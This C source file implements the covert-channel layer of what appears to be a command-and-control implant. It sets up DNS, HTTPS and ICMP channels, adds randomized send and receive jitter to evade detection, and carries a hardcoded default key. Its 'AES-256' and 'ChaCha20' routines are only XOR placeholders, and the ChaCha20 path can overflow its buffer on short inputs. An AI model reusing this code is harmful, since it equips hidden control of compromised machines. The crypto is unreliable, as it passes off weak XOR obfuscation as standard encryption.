/**
 * @file covert_channel.c
 * @brief Implementation of covert communication channels module
 * @author iamtomasanderson@gmail.com
 * @date 2023-09-01
 */

#include "../include/covert_channel.h"
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#include <sys/time.h>
#endif

#define MAX_ERROR_MSG_LEN 256

/**
 * @brief Structure to hold covert channel context
 */
struct CovertChannel {
    CovertChannelType type;
    EncryptionType encryption;
    char* server_address;
    uint16_t server_port;
    uint8_t* key;
    size_t key_length;
    unsigned int jitter_min;
    unsigned int jitter_max;
    void* channel_data;
    char error_msg[MAX_ERROR_MSG_LEN];
    
    /* Function pointers for channel-specific operations */
    int (*channel_init)(struct CovertChannel*);
    int (*channel_connect)(struct CovertChannel*);
    int (*channel_send)(struct CovertChannel*, const uint8_t*, size_t);
    int (*channel_receive)(struct CovertChannel*, uint8_t*, size_t);
    void (*channel_cleanup)(struct CovertChannel*);
};

/* Forward declarations of channel-specific functions */
int dns_channel_init(struct CovertChannel* channel);
int dns_channel_connect(struct CovertChannel* channel);
int dns_channel_send(struct CovertChannel* channel, const uint8_t* data, size_t data_len);
int dns_channel_receive(struct CovertChannel* channel, uint8_t* buffer, size_t buffer_size);
void dns_channel_cleanup(struct CovertChannel* channel);

int https_channel_init(struct CovertChannel* channel);
int https_channel_connect(struct CovertChannel* channel);
int https_channel_send(struct CovertChannel* channel, const uint8_t* data, size_t data_len);
int https_channel_receive(struct CovertChannel* channel, uint8_t* buffer, size_t buffer_size);
void https_channel_cleanup(struct CovertChannel* channel);

int icmp_channel_init(struct CovertChannel* channel);
int icmp_channel_connect(struct CovertChannel* channel);
int icmp_channel_send(struct CovertChannel* channel, const uint8_t* data, size_t data_len);
int icmp_channel_receive(struct CovertChannel* channel, uint8_t* buffer, size_t buffer_size);
void icmp_channel_cleanup(struct CovertChannel* channel);

/* Encryption functions */
static int encrypt_data(struct CovertChannel* channel, const uint8_t* input, size_t input_len, 
                        uint8_t* output, size_t output_size, size_t* output_len);
static int decrypt_data(struct CovertChannel* channel, const uint8_t* input, size_t input_len, 
                        uint8_t* output, size_t output_size, size_t* output_len);

/* Helper functions */
static void set_error(struct CovertChannel* channel, const char* format, ...);
static unsigned int get_random_delay(unsigned int min, unsigned int max);
static void sleep_ms(unsigned int ms);

/**
 * Initialize a covert channel with given configuration
 */
CovertChannelHandle covert_channel_init(CovertChannelConfig* config) {
    if (!config || !config->server_address) {
        return NULL;
    }
    
    /* Allocate and initialize channel structure */
    struct CovertChannel* channel = (struct CovertChannel*)calloc(1, sizeof(struct CovertChannel));
    if (!channel) {
        return NULL;
    }
    
    /* Initialize random number generator */
    srand((unsigned int)time(NULL));
    
    /* Copy configuration */
    channel->type = config->channel_type;
    channel->encryption = config->encryption_type;
    channel->server_port = config->server_port;
    channel->jitter_min = config->jitter_min_ms;
    channel->jitter_max = config->jitter_max_ms;
    
    /* Set default jitter if not specified */
    if (channel->jitter_min == 0 && channel->jitter_max == 0) {
        channel->jitter_min = 100;
        channel->jitter_max = 1000;
    }
    
    /* Copy server address */
    channel->server_address = strdup(config->server_address);
    if (!channel->server_address) {
        free(channel);
        return NULL;
    }
    
    /* Copy encryption key if provided */
    if (config->encryption_key && config->key_length > 0) {
        channel->key = (uint8_t*)malloc(config->key_length);
        if (!channel->key) {
            free(channel->server_address);
            free(channel);
            return NULL;
        }
        memcpy(channel->key, config->encryption_key, config->key_length);
        channel->key_length = config->key_length;
    } else if (config->encryption_type != ENCRYPTION_NONE) {
        /* Generate a simple default key if encryption is enabled but no key provided */
        const char* default_key = "NeuroZond_DefaultKey_2023";
        size_t default_key_len = strlen(default_key);
        
        channel->key = (uint8_t*)malloc(default_key_len);
        if (!channel->key) {
            free(channel->server_address);
            free(channel);
            return NULL;
        }
        memcpy(channel->key, default_key, default_key_len);
        channel->key_length = default_key_len;
    }
    
    /* Set up channel-specific function pointers */
    switch (channel->type) {
        case CHANNEL_TYPE_DNS:
            channel->channel_init = dns_channel_init;
            channel->channel_connect = dns_channel_connect;
            channel->channel_send = dns_channel_send;
            channel->channel_receive = dns_channel_receive;
            channel->channel_cleanup = dns_channel_cleanup;
            break;
            
        case CHANNEL_TYPE_HTTPS:
            channel->channel_init = https_channel_init;
            channel->channel_connect = https_channel_connect;
            channel->channel_send = https_channel_send;
            channel->channel_receive = https_channel_receive;
            channel->channel_cleanup = https_channel_cleanup;
            break;
            
        case CHANNEL_TYPE_ICMP:
            channel->channel_init = icmp_channel_init;
            channel->channel_connect = icmp_channel_connect;
            channel->channel_send = icmp_channel_send;
            channel->channel_receive = icmp_channel_receive;
            channel->channel_cleanup = icmp_channel_cleanup;
            break;
            
        default:
            set_error(channel, "Unsupported channel type: %d", channel->type);
            free(channel->key);
            free(channel->server_address);
            free(channel);
            return NULL;
    }
    
    /* Initialize the specific channel type */
    if (channel->channel_init && channel->channel_init(channel) < 0) {
        free(channel->key);
        free(channel->server_address);
        free(channel);
        return NULL;
    }
    
    return (CovertChannelHandle)channel;
}

/**
 * Connect to C1 server using the covert channel
 */
int covert_channel_connect(CovertChannelHandle handle) {
    struct CovertChannel* channel = (struct CovertChannel*)handle;
    
    if (!channel) {
        return -1;
    }
    
    if (!channel->channel_connect) {
        set_error(channel, "Channel connect function not implemented");
        return -1;
    }
    
    return channel->channel_connect(channel);
}

/**
 * Send data through covert channel
 */
int covert_channel_send(CovertChannelHandle handle, const uint8_t* data, size_t data_len) {
    struct CovertChannel* channel = (struct CovertChannel*)handle;
    
    if (!channel || !data || data_len == 0) {
        return -1;
    }
    
    if (!channel->channel_send) {
        set_error(channel, "Channel send function not implemented");
        return -1;
    }
    
    /* Add jitter delay before sending */
    sleep_ms(get_random_delay(channel->jitter_min, channel->jitter_max));
    
    /* If encryption is enabled, encrypt the data first */
    if (channel->encryption != ENCRYPTION_NONE) {
        uint8_t* encrypted = (uint8_t*)malloc(data_len * 2); /* Allow space for encryption overhead */
        if (!encrypted) {
            set_error(channel, "Failed to allocate memory for encryption");
            return -1;
        }
        
        size_t encrypted_len = 0;
        if (encrypt_data(channel, data, data_len, encrypted, data_len * 2, &encrypted_len) < 0) {
            free(encrypted);
            return -1;
        }
        
        /* Send the encrypted data */
        int result = channel->channel_send(channel, encrypted, encrypted_len);
        free(encrypted);
        return result;
    }
    
    /* Send the plaintext data */
    return channel->channel_send(channel, data, data_len);
}

/**
 * Receive data from covert channel
 */
int covert_channel_receive(CovertChannelHandle handle, uint8_t* buffer, size_t buffer_size) {
    struct CovertChannel* channel = (struct CovertChannel*)handle;
    
    if (!channel || !buffer || buffer_size == 0) {
        return -1;
    }
    
    if (!channel->channel_receive) {
        set_error(channel, "Channel receive function not implemented");
        return -1;
    }
    
    /* Add jitter delay before receiving */
    sleep_ms(get_random_delay(channel->jitter_min, channel->jitter_max));
    
    /* If encryption is enabled, we need to receive into a temporary buffer first */
    if (channel->encryption != ENCRYPTION_NONE) {
        uint8_t* encrypted = (uint8_t*)malloc(buffer_size);
        if (!encrypted) {
            set_error(channel, "Failed to allocate memory for decryption");
            return -1;
        }
        
        int recv_len = channel->channel_receive(channel, encrypted, buffer_size);
        if (recv_len <= 0) {
            free(encrypted);
            return recv_len;
        }
        
        size_t decrypted_len = 0;
        if (decrypt_data(channel, encrypted, recv_len, buffer, buffer_size, &decrypted_len) < 0) {
            free(encrypted);
            return -1;
        }
        
        free(encrypted);
        return (int)decrypted_len;
    }
    
    /* Receive plaintext data */
    return channel->channel_receive(channel, buffer, buffer_size);
}

/**
 * Set jitter values for transmission timing
 */
int covert_channel_set_jitter(CovertChannelHandle handle, unsigned int min_ms, unsigned int max_ms) {
    struct CovertChannel* channel = (struct CovertChannel*)handle;
    
    if (!channel) {
        return -1;
    }
    
    if (min_ms > max_ms) {
        set_error(channel, "Invalid jitter range: min (%u) > max (%u)", min_ms, max_ms);
        return -1;
    }
    
    channel->jitter_min = min_ms;
    channel->jitter_max = max_ms;
    
    return 0;
}

/**
 * Close and clean up a covert channel
 */
void covert_channel_cleanup(CovertChannelHandle handle) {
    struct CovertChannel* channel = (struct CovertChannel*)handle;
    
    if (!channel) {
        return;
    }
    
    /* Call channel-specific cleanup function if available */
    if (channel->channel_cleanup) {
        channel->channel_cleanup(channel);
    }
    
    /* Free resources */
    free(channel->server_address);
    
    if (channel->key) {
        /* Securely wipe key from memory before freeing */
        memset(channel->key, 0, channel->key_length);
        free(channel->key);
    }
    
    free(channel);
}

/**
 * Get the last error message
 */
const char* covert_channel_get_error(CovertChannelHandle handle) {
    struct CovertChannel* channel = (struct CovertChannel*)handle;
    
    if (!channel) {
        return "Invalid channel handle";
    }
    
    return channel->error_msg;
}

/* --- Implementation of helper functions --- */

/**
 * Set error message in the channel context
 */
static void set_error(struct CovertChannel* channel, const char* format, ...) {
    if (!channel) {
        return;
    }
    
    va_list args;
    va_start(args, format);
    vsnprintf(channel->error_msg, MAX_ERROR_MSG_LEN - 1, format, args);
    va_end(args);
}

/**
 * Get a random delay between min and max milliseconds
 */
static unsigned int get_random_delay(unsigned int min, unsigned int max) {
    if (min >= max) {
        return min;
    }
    
    return min + (rand() % (max - min + 1));
}

/**
 * Sleep for the specified number of milliseconds
 */
static void sleep_ms(unsigned int ms) {
#ifdef _WIN32
    Sleep(ms);
#else
    usleep(ms * 1000);
#endif
}

/* --- Encryption implementation --- */

/**
 * Simple XOR encryption
 */
static int xor_encrypt(const uint8_t* key, size_t key_len, const uint8_t* input, 
                      size_t input_len, uint8_t* output, size_t output_size) {
    if (output_size < input_len) {
        return -1;
    }
    
    for (size_t i = 0; i < input_len; i++) {
        output[i] = input[i] ^ key[i % key_len];
    }
    
    return 0;
}

/**
 * ChaCha20 encryption implementation
 * This is a simple implementation for demonstration purposes
 */
static int chacha20_encrypt(const uint8_t* key, size_t key_len, 
                           const uint8_t* input, size_t input_len,
                           uint8_t* output, size_t output_size) {
    if (output_size < input_len || key_len < 32) {
        return -1;
    }
    
    // Generate a nonce (8 bytes)
    uint8_t nonce[8];
    for (int i = 0; i < 8; i++) {
        nonce[i] = rand() % 256;
    }
    
    // Copy nonce to the beginning of the output
    memcpy(output, nonce, 8);
    
    // Simplified ChaCha20 - for real implementation, use a crypto library
    // This is just a placeholder that does XOR with key+nonce for demo
    for (size_t i = 0; i < input_len; i++) {
        uint8_t keystream = key[i % key_len] ^ nonce[i % 8] ^ ((i & 0xFF) ^ ((i >> 8) & 0xFF));
        output[i + 8] = input[i] ^ keystream;
    }
    
    return 0;
}

/**
 * ChaCha20 decryption implementation
 */
static int chacha20_decrypt(const uint8_t* key, size_t key_len,
                           const uint8_t* input, size_t input_len,
                           uint8_t* output, size_t output_size) {
    if (input_len <= 8 || output_size < (input_len - 8) || key_len < 32) {
        return -1;
    }
    
    // Extract nonce from the beginning of input
    uint8_t nonce[8];
    memcpy(nonce, input, 8);
    
    // Decrypt data
    size_t data_len = input_len - 8;
    for (size_t i = 0; i < data_len; i++) {
        uint8_t keystream = key[i % key_len] ^ nonce[i % 8] ^ ((i & 0xFF) ^ ((i >> 8) & 0xFF));
        output[i] = input[i + 8] ^ keystream;
    }
    
    return 0;
}

/**
 * AES-256 encryption implementation (simplified)
 */
static int aes256_encrypt(const uint8_t* key, size_t key_len,
                         const uint8_t* input, size_t input_len,
                         uint8_t* output, size_t output_size) {
    if (output_size < input_len + 16 || key_len < 32) {
        return -1;
    }
    
    // Generate IV (16 bytes)
    uint8_t iv[16];
    for (int i = 0; i < 16; i++) {
        iv[i] = rand() % 256;
    }
    
    // Copy IV to the beginning of output
    memcpy(output, iv, 16);
    
    // Simplified AES - for real implementation, use a crypto library
    // This is just a placeholder that does XOR with key+iv for demo
    for (size_t i = 0; i < input_len; i++) {
        uint8_t keystream = key[i % key_len] ^ iv[i % 16] ^ ((i & 0xFF) ^ ((i >> 8) & 0xFF));
        output[i + 16] = input[i] ^ keystream;
    }
    
    return 0;
}

/**
 * AES-256 decryption implementation (simplified)
 */
static int aes256_decrypt(const uint8_t* key, size_t key_len,
                         const uint8_t* input, size_t input_len,
                         uint8_t* output, size_t output_size) {
    if (input_len <= 16 || output_size < (input_len - 16) || key_len < 32) {
        return -1;
    }
    
    // Extract IV from the beginning of input
    uint8_t iv[16];
    memcpy(iv, input, 16);
    
    // Decrypt data
    size_t data_len = input_len - 16;
    for (size_t i = 0; i < data_len; i++) {
        uint8_t keystream = key[i % key_len] ^ iv[i % 16] ^ ((i & 0xFF) ^ ((i >> 8) & 0xFF));
        output[i] = input[i + 16] ^ keystream;
    }
    
    return 0;
}

/**
 * Encrypt data using the configured encryption method
 */
static int encrypt_data(struct CovertChannel* channel, const uint8_t* input, size_t input_len, 
                       uint8_t* output, size_t output_size, size_t* output_len) {
    if (!channel || !input || !output || !output_len) {
        return -1;
    }
    
    switch (channel->encryption) {
        case ENCRYPTION_XOR:
            if (xor_encrypt(channel->key, channel->key_length, input, input_len, output, output_size) < 0) {
                set_error(channel, "XOR encryption failed");
                return -1;
            }
            *output_len = input_len;
            return 0;
            
        case ENCRYPTION_AES256:
            if (aes256_encrypt(channel->key, channel->key_length, input, input_len, output, output_size) < 0) {
                set_error(channel, "AES-256 encryption failed");
                return -1;
            }
            *output_len = input_len + 16; // Data + IV
            return 0;
            
        case ENCRYPTION_CHACHA20:
            if (chacha20_encrypt(channel->key, channel->key_length, input, input_len, output, output_size) < 0) {
                set_error(channel, "ChaCha20 encryption failed");
                return -1;
            }
            *output_len = input_len + 8; // Data + nonce
            return 0;
            
        case ENCRYPTION_NONE:
            /* Just copy the data */
            if (output_size < input_len) {
                set_error(channel, "Output buffer too small");
                return -1;
            }
            memcpy(output, input, input_len);
            *output_len = input_len;
            return 0;
            
        default:
            set_error(channel, "Unknown encryption type: %d", channel->encryption);
            return -1;
    }
}

/**
 * Decrypt data using the configured encryption method
 */
static int decrypt_data(struct CovertChannel* channel, const uint8_t* input, size_t input_len, 
                       uint8_t* output, size_t output_size, size_t* output_len) {
    if (!channel || !input || !output || !output_len) {
        return -1;
    }
    
    switch (channel->encryption) {
        case ENCRYPTION_XOR:
            /* XOR encryption and decryption are the same operation */
            if (xor_encrypt(channel->key, channel->key_length, input, input_len, output, output_size) < 0) {
                set_error(channel, "XOR decryption failed");
                return -1;
            }
            *output_len = input_len;
            return 0;
            
        case ENCRYPTION_AES256:
            if (aes256_decrypt(channel->key, channel->key_length, input, input_len, output, output_size) < 0) {
                set_error(channel, "AES-256 decryption failed");
                return -1;
            }
            *output_len = input_len - 16; // Remove IV size
            return 0;
            
        case ENCRYPTION_CHACHA20:
            if (chacha20_decrypt(channel->key, channel->key_length, input, input_len, output, output_size) < 0) {
                set_error(channel, "ChaCha20 decryption failed");
                return -1;
            }
            *output_len = input_len - 8; // Remove nonce size
            return 0;
            
        case ENCRYPTION_NONE:
            /* Just copy the data */
            if (output_size < input_len) {
                set_error(channel, "Output buffer too small");
                return -1;
            }
            memcpy(output, input, input_len);
            *output_len = input_len;
            return 0;
            
        default:
            set_error(channel, "Unknown encryption type: %d", channel->encryption);
            return -1;
    }
} 